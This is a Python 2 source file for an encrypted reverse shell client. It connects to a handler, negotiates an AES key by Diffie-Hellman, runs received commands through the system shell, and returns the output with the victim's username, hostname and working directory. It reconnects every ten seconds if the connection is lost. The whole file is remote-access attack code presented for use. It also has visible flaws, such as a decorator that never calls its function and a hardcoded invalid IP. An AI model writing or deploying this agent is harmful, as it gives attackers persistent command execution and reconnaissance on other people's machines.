#!/usr/bin/env python2
import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random
from Crypto.Cipher import AES

def windows_only(func):
	def tester(junk):
		if os.name != "nt": return "Command not available on non-windows OS."
	return tester

class Shell:
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.comm_socket = socket.socket()
		
		self.possible_info = ["cwd","ip","data","username","localtime","hostname"]
		self.sent_info = ["cwd","ip","data","username","localtime","hostname"]
		
	def gen_diffie_key(self):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		self.comm_socket.sendall(str(public_key))
		server_key = self.comm_socket.recv(4096)
		
		sharedSecret = pow(int(server_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		print key, IV
	
		return key, IV
		
	def encrypt(self, data):
		return base64.b64encode(self.aes_obj.encrypt(data))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(base64.b64decode(data))

	def connect(self):
		self.comm_socket.connect((self.handler_ip, self.handler_port))
		
		key, IV = self.gen_diffie_key()
		self.aes_obj = AES.new(key, AES.MODE_CFB, IV)
		
	def get_data(self):
		data = self.comm_socket.recv(4096)
		if not data: raise Exception("Handler disconnected")
		data = self.decrypt(data)
		return data
		
	def set_package_items(self, items):
		if items == "minimal":
			self.sent_info = ["data"]
		elif items == "small":
			self.sent_info = ["data","cwd"]
		elif items == "userathost":
			self.sent_info = ["data","cwd","username","hostname"]
		else:
			self.sent_info = items.split()
			for item in list(self.sent_info):
				if item not in self.possible_info:
					self.sent_info.remove(item)
			if "data" not in self.sent_info: self.sent_info.append("data")
		return "Now sending "+repr(self.sent_info)
		
	def package(self, data):
		package = {}
		package["cwd"] = base64.b64encode(os.getcwd())
		package["ip"] = base64.b64encode("192.168.1.355")
		package["data"] = base64.b64encode(data)
		package["username"] = base64.b64encode(getpass.getuser())
		package["localtime"] = base64.b64encode(datetime.datetime.now().strftime("%H:%M:%S"))
		package["hostname"] = base64.b64encode(socket.gethostname())

		for key in package.keys():
			if key not in self.sent_info: package[key] = ""
			
		return json.dumps(package)


	def send_data(self, data):
		data_package = self.package(data)
		data_package = self.encrypt(data_package)
		self.comm_socket.sendall(data_package)
		
	def execute_shell_command(self, command):
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		proc_kill = lambda p: subprocess.Popen("TASKKILL /F /PID {pid} /T".format(pid=p.pid))
		timer = threading.Timer(60, proc_kill, [proc])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		timer.cancel()
		return out
		
	@windows_only
	def windows_only_thing(self):
		return "ass"
		
	def change_directory(self, dir):
		try:
			os.chdir(dir)
			return ""
		except Exception as e:
			return str(e)
		
	def handle_command(self, data):
		command = data.split()[0]
		try:
			arguments = " ".join(data.split()[1:])
		except IndexError:
			pass
			
		if command == "test":
			output = self.windows_only_thing()
		elif command == "prompt":
			if not arguments:
				output = "Set to one or more values: cwd, ip, data, hostname, username, localtime; or use preset: minimal, small, userathost"
			else:
				output = self.set_package_items(arguments)
		elif command == "cd":
			output = self.change_directory(arguments)
		else:
			output = self.execute_shell_command(command+" "+arguments)
			
		return output
		
		
	def run(self):
		while True:
			data = self.get_data()
			print data
			output = self.handle_command(data)
			self.send_data(output)
			
while True:
	try:
		shell = Shell("127.0.0.1", 8080)
		shell.connect()
		shell.run()
	except Exception as e:
		print e
		time.sleep(10)
		continue
